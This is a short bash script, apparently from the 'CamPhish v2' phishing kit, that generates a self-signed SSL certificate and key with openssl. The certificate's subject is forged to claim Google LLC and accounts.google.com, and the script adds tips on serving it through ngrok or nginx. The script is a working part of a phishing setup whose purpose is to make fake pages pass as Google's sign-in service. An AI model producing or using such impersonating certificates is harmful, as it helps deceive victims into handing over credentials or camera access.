#!/bin/bash
# CamPhish v2 - SSL Certificate Auto-Generator
# Generates self-signed SSL certificate for HTTPS

SSL_DIR="./ssl"
CERT_FILE="${SSL_DIR}/cert.pem"
KEY_FILE="${SSL_DIR}/key.pem"
DAYS=365

# Create SSL directory
mkdir -p "$SSL_DIR"

# Check if OpenSSL is installed
if ! command -v openssl &> /dev/null; then
    echo "[!] OpenSSL is not installed. Please install it first."
    exit 1
fi

# Check if certificate already exists
if [[ -f "$CERT_FILE" ]] && [[ -f "$KEY_FILE" ]]; then
    echo "[*] SSL certificate already exists."
    read -p "[+] Generate new one? [Y/n]: " regen
    if [[ $regen != "Y" && $regen != "y" ]]; then
        echo "[*] Using existing certificate."
        exit 0
    fi
fi

echo "[*] Generating self-signed SSL certificate..."

# Generate private key and certificate
openssl req -x509 -newkey rsa:2048 \
    -keyout "$KEY_FILE" \
    -out "$CERT_FILE" \
    -days $DAYS \
    -nodes \
    -subj "/C=US/ST=California/L=Mountain View/O=Google LLC/OU=Security/CN=accounts.google.com" \
    2>/dev/null

if [[ $? -eq 0 ]]; then
    echo "[*] SSL certificate generated successfully!"
    echo "[*] Certificate: $CERT_FILE"
    echo "[*] Key: $KEY_FILE"
    echo ""
    echo "[+] To use with PHP built-in server:"
    echo "    Not directly supported. Use a reverse proxy like nginx."
    echo ""
    echo "[+] To use with ngrok (recommended):"
    echo "    ngrok already provides HTTPS automatically."
    echo ""
    echo "[+] Certificate details:"
    openssl x509 -in "$CERT_FILE" -noout -subject -dates 2>/dev/null
else
    echo "[!] Failed to generate SSL certificate."
    exit 1
fi
